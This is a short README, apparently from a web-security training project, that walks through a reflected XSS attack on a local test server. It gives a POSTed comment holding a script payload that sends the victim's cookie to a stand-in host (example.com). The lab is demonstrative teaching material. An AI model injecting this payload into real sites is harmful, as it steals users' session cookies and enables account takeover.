# SecuringWebApplications
## 1. reflectedXssAttack1
a. Post a comment to the the url 

      URL:'http://localhost:8080/reflectedXssAttack1/Comment'

      Method : POST

      Request Body

          comment : <script>window.location='http://example.com/?cookie='+document.cookie</script>


b. Get the comment from the url
http://localhost:8080/reflectedXssAttack1/Comment
